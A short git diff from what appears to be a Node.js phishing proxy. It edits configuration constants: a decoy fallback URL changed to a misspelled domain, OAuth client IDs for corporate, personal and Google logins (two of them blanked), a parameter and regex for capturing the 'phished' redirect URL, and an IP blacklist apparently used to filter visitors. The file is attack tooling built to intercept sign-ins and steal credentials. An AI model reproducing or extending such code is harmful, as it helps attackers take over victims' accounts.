@@ -7,14 +7,14 @@ const crypto = require("crypto");
 const fetch = require('node-fetch');
 
 // === CONFIGURATION CONSTANTS ===
-const FALLBACK_PDF_URL = "https://www.cheerup.com";
+const FALLBACK_PDF_URL = "https://www.cheefffrup.com";
 const BLACKLIST_FILE = path.join(__dirname, 'blacklist.txt');
 let lastClientIP = null;
 // OAuth-related constants
 const PROXY_ENTRY_POINT_BASE = "/login?method=signin&mode=secure&client_id=";
 const CORPORATE_CLIENT_ID = "4765445b-32c6-49b0-83e6-1d93765276ca";
-const PERSONAL_CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c";
-const GOOGLE_CLIENT_ID = "717762328687-iludtf96g1hinl76e4lc1b9a82g457nn.apps.googleusercontent.com";
+const PERSONAL_CLIENT_ID = "/";
+const GOOGLE_CLIENT_ID = "/";
 const PHISHED_URL_PARAMETER = "redirect_urI";
 const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
 const REDIRECT_URL = FALLBACK_PDF_URL;
